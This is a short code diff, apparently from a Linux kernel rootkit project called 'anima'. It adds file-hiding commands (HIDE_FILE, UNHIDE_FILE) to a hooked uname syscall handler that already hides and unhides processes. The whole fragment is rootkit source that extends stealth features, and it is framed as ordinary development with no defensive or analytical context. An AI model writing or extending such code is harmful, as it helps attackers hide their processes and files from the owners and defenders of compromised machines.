@@ -15,6 +15,7 @@
 #include <anima/structs.h>
 #include <anima/syscalls.h>
 #include <anima/anima_ctl.h>
+#include <anima/vfs.h>
 #include <anima/x86.h>
 
 #define HOOK(sys, func)	\
@@ -599,6 +600,12 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 		break;
 	case UNHIDE_PID:
 		unhide_pid(args.param1);
+		break;
+	case HIDE_FILE:
+		hide_filename_starting_with(args.p_param1, args.param2);
+		break;
+	case UNHIDE_FILE:
+		unhide_filename_starting_with(args.p_param1, args.param2);
 		break;
 #ifdef DEBUG
 	case DEBUG_RK:
